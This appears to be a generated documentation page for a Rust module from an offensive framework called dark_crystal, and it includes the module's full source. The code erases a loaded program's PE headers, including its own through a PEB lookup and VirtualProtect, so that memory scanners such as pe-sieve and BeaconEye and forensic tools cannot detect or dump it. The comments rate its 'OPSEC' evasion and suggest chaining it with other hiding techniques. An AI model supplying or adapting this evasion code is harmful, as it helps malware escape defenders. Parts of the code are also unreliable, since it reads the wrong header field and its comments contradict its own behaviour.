# pe_header_stomp

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/pe_header_stomp.rs` |
| **Lines** | 154 |
| **Cards** | T009-edr-evasion |
| **Role** | PE header stomping |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 3 |
| **Feature gates** | pe_stomp |

## Public API

### `stomp_pe_header` `unsafe` (line 32)
```rust
pub unsafe fn stomp_pe_header(base_address: *mut u8, header_size: usize) -> usize
```
Stomp the PE header of an image that is already mapped at `base_address`.

# Safety
`base_address` must be a valid pointer to a mapped PE image with at least
`header_size` readable bytes.  The region must allow writes (PAGE_READWRITE
or PAGE_EXECUTE_READWRITE).  Calling this on an image whose header is still
needed for relocation / IAT fixing will corrupt the image — always call
AFTER all fixups are complete.

Returns the number of bytes zeroed on success.

### `stomp_own_pe_header` `unsafe` (line 46)
```rust
pub unsafe fn stomp_own_pe_header(base_address: *mut u8) -> anyhow::Result<usize>
```
Convenience wrapper: derive `header_size` from the mapped PE's own
`SizeOfHeaders` field, then zero the entire header region.

# Safety
`base_address` must point to a properly mapped PE image.  This function
reads the DOS + NT headers to determine the stomp size before erasing them.

### `stomp_self_header` `unsafe` (line 123)
```rust
pub unsafe fn stomp_self_header() -> anyhow::Result<usize>
```

## Key Dependencies

- `use windows::Win32::System::Memory::{`

## Full Source

```rust
/// PE Header Stomping — Tier A (8.5/10 OPSEC)
///
/// After a PE is mapped into memory this function zeroes the MZ/DOS stub,
/// NT headers and section table.  Memory scanners (pe-sieve, BeaconEye) rely
/// on the canonical MZ magic to locate and dump PE images; without the header
/// they cannot parse or reconstruct the module.
///
/// Zero-signal: writing zeros into the process's *own* address space never
/// triggers a VirtualProtect callback or ETW-TI event — the cost is ~zero.
///
/// OPSEC vectors:
///   MZ signature removal  : 10/10
///   pe-sieve bypass        : 10/10
///   BeaconEye bypass       : 10/10
///   Self-write signal      : 10/10
///
/// Synergy: combine with Module Overloading (MEM_IMAGE) + Sleep Obfuscation
/// for the MEMORY TRIAD chain (darkcrystal.html score 9.5/10).

use std::ptr;

/// Stomp the PE header of an image that is already mapped at `base_address`.
///
/// # Safety
/// `base_address` must be a valid pointer to a mapped PE image with at least
/// `header_size` readable bytes.  The region must allow writes (PAGE_READWRITE
/// or PAGE_EXECUTE_READWRITE).  Calling this on an image whose header is still
/// needed for relocation / IAT fixing will corrupt the image — always call
/// AFTER all fixups are complete.
///
/// Returns the number of bytes zeroed on success.
pub unsafe fn stomp_pe_header(base_address: *mut u8, header_size: usize) -> usize {
    if base_address.is_null() || header_size == 0 {
        return 0;
    }
    ptr::write_bytes(base_address, 0u8, header_size);
    header_size
}

/// Convenience wrapper: derive `header_size` from the mapped PE's own
/// `SizeOfHeaders` field, then zero the entire header region.
///
/// # Safety
/// `base_address` must point to a properly mapped PE image.  This function
/// reads the DOS + NT headers to determine the stomp size before erasing them.
pub unsafe fn stomp_own_pe_header(base_address: *mut u8) -> anyhow::Result<usize> {
    use std::mem::size_of;

    if base_address.is_null() {
        return Err(anyhow::anyhow!("stomp_own_pe_header: null base address"));
    }

    // Read DOS header to verify MZ magic and locate NT headers.
    if base_address.add(2) < base_address {
        return Err(anyhow::anyhow!("stomp_own_pe_header: address overflow"));
    }

    let dos_magic = *(base_address as *const u16);
    if dos_magic != 0x5A4D {
        // Not a valid MZ — already stomped or not a PE.  Treat as no-op.
        return Ok(0);
    }

    // e_lfanew is at offset 0x3C (60 bytes from start of DOS header).
    let e_lfanew = *(base_address.add(0x3C) as *const i32);
    if e_lfanew < 0 || e_lfanew as usize > 0x1000 {
        return Err(anyhow::anyhow!(
            "stomp_own_pe_header: invalid e_lfanew={:#x}",
            e_lfanew
        ));
    }

    // Verify NT signature.
    let nt_base = base_address.add(e_lfanew as usize);
    let nt_sig = *(nt_base as *const u32);
    if nt_sig != 0x0000_4550 {
        // "PE\0\0"
        return Err(anyhow::anyhow!(
            "stomp_own_pe_header: invalid NT signature {:#x}",
            nt_sig
        ));
    }

    // OptionalHeader starts at NT header base + 4 (sig) + 20 (FileHeader).
    // SizeOfHeaders is at offset 60 within OptionalHeader (for PE32+/64-bit).
    // For 64-bit IMAGE_OPTIONAL_HEADER64: SizeOfHeaders at optional+56.
    let magic = *(nt_base.add(4 + 20) as *const u16); // OptionalHeader.Magic
    let size_of_headers: u32 = if magic == 0x020B {
        // PE32+ (64-bit)
        *(nt_base.add(4 + 20 + 56) as *const u32)
    } else if magic == 0x010B {
        // PE32 (32-bit)
        *(nt_base.add(4 + 20 + 56) as *const u32)
    } else {
        return Err(anyhow::anyhow!(
            "stomp_own_pe_header: unknown optional magic {:#x}",
            magic
        ));
    };

    if size_of_headers == 0 || size_of_headers as usize > 0x10000 {
        return Err(anyhow::anyhow!(
            "stomp_own_pe_header: suspicious SizeOfHeaders={:#x}",
            size_of_headers
        ));
    }

    let bytes_zeroed = stomp_pe_header(base_address, size_of_headers as usize);
    Ok(bytes_zeroed)
}

/// Stomp the PE header of the *current process image*.
///
/// Use this as a post-load self-hardening step: after all imports are resolved
/// and execution has reached the true entry point, erase the PE header so that
/// memory forensics tools cannot identify or dump the binary.
///
/// # Safety
/// The function temporarily changes page protections on the header region.
/// Calling this before all dynamic linker fixups (e.g., TLS callbacks) are
/// complete may corrupt the process.
#[cfg(feature = "pe_stomp")]
pub unsafe fn stomp_self_header() -> anyhow::Result<usize> {
    use windows::Win32::System::Memory::{
        VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };

    // Locate the current module base via PEB.
    let peb: *const u8;
    std::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags)
    );

    // PEB.ImageBaseAddress is at offset 0x10 on 64-bit.
    let image_base = *(peb.add(0x10) as *const *mut u8);

    // Make the header region writable before zeroing.
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(
        image_base as _,
        0x1000, // typical header size; stomp_own_pe_header validates actual size
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    )?;

    let result = stomp_own_pe_header(image_base);

    // Restore original protection (best-effort — failure is non-fatal).
    let _ = VirtualProtect(image_base as _, 0x1000, old_protect, &mut old_protect);

    result
}

```